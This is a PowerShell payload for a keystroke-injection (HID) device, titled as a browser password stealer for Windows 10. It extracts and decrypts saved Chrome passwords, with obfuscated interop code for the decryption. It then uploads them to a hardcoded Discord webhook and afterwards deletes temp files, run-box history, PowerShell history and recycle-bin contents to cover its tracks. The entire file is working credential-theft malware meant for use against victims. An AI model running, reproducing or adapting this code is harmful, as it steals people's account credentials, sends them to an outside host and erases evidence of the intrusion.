#########################################################################################################
#                                                               |                                       #
# Title        : Browser-Passwords-Discord-Exfiltration         |   ____ _____   ______                 #
# Author       : DIYS.py                                        |  |  _ \_ _\ \ / / ___|  _ __  _   _   #
# Version      : 1.0                                            |  | | | | | \ V /\___ \ | '_ \| | | |  #
# Category     : Credentials, Exfiltration                      |  | |_| | |  | |  ___) || |_) | |_| |  #
# Target       : Windows 10                                     |  |____/___| |_| |____(_) .__/ \__, |  #
# Mode         : HID                                            |                        |_|    |___/   #
# Props        : I am Jakoby, NULLSESSION0X                     |                                       #
#                                                               |                                       # 
#########################################################################################################

<#
.SYNOPSIS
    This script exfiltrates credentials from the browser via Discord webhook.
.DESCRIPTION 
    Checks and saves the credentials from the Chrome browser, then connects to Discord and uploads
    the file containing all of the loot.
.Link
    https://discord.com/developers/docs/resources/webhook
#>

# Define Discord webhook URL
$DiscordWebhookUrl = "https://discord.com/api/webhooks/1280938491231862825/AOmwFnNFIHX-dOKbcx2HVV7B5EN3PJfe8bH3Gt7xa-oRgHnCzx5ZA1ii7OZsDtvbITRw"

$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"

# Stage 1: Obtain the credentials from the Chrome browser's User Data folder

# Kill Chrome process to be safe
Stop-Process -Name Chrome -ErrorAction SilentlyContinue

$d = Add-Type -A System.Security
$p = 'public static'
$g = """)]$p extern"
$i = '[DllImport("winsqlite3",EntryPoint="sqlite3_'
$m = "[MarshalAs(UnmanagedType.LP"
$q = '(s,i)'
$f = '(p s,int i)'
$z = $env:LOCALAPPDATA + '\Google\Chrome\User Data'
$u = [Security.Cryptography.ProtectedData]
Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}"
$s = [W]::O("$z\\Default\\Login Data", [ref]$d)
$l = @()
if ($host.Version -like "7*") {
    $b = (gc "$z\\Local State" | ConvertFrom-Json).os_crypt.encrypted_key
    $x = [Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String($b)[5..($b.length-1)], $n, 0))
}
$_ = [W]::P($d, "SELECT * FROM logins WHERE blacklisted_by_user=0", -1, [ref]$s, 0)
for (; !([W]::S($s) % 100)) {
    $l += [W]::T($s, 0), [W]::T($s, 3)
    $c = [W]::B($s, 5)
    try {
        $e = $u::Unprotect($c, $n, 0)
    } catch {
        if ($x) {
            $k = $c.length
            $e = [byte[]]::new($k - 31)
            $x.Decrypt($c[3..14], $c[15..($k-17)], $c[($k-16)..($k-1)], $e)
        }
    }
    $l += ($e | % { [char]$_ }) -join ''
}

# Format the extracted credentials
$FormattedCredentials = "============================`n"
$FormattedCredentials += "            MOTS DE PASSE 🔐`n"
$FormattedCredentials += "============================`n"

for ($i = 0; $i -lt $l.Length; $i += 3) {
    $account = $l[$i]
    $username = $l[$i + 1]
    $password = $l[$i + 2]
    $url = "https://www.example.com"  # Example URL, replace with actual URL if available
    
    $FormattedCredentials += "`n1. **Compte : $account 🛠️**`n"
    $FormattedCredentials += "   - **Nom d'utilisateur :** $username 🧑‍💻`n"
    $FormattedCredentials += "   - **Mot de passe :** $password 🔑`n"
    $FormattedCredentials += "   - **URL :** $url 🌐`n"
}

$FormattedCredentials += "============================"

# Stage 2: Upload the credentials to Discord via webhook

$body = @{
    content = $FormattedCredentials
}

Invoke-RestMethod -Uri $DiscordWebhookUrl -Method Post -Body ($body | ConvertTo-Json -Compress) -ContentType "application/json"

# Stage 3: Cleanup Traces

<#
.NOTES 
    This section cleans up the environment to remove traces of the attack.
#>

# Delete contents of Temp folder
Remove-Item -Path $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Delete contents of recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

exit
